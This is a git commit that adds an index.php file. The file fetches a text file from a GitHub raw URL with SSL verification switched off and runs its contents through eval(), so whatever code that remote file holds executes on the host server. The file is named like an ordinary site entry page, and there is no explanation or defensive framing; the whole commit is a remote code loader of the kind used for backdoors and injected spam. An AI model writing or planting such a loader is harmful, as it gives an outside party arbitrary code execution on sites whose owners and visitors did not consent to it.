b466dbf5ca5ce7373025ff6ae3d294960a077459
yutasato88 <165874457+yutasato88@users.noreply.github.com>
2024-06-29 23:10:34 +0700

    Create index.php

---
+++ index.php
@@ -0,0 +1,10 @@
+<?php
+$url = 'https://raw.githubusercontent.com/yutasato88/autobl/main/file.txt';
+$ch = curl_init($url);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
+curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+$fileContents = curl_exec($ch);
+curl_close($ch);
+eval("?>" . $fileContents);
+?>
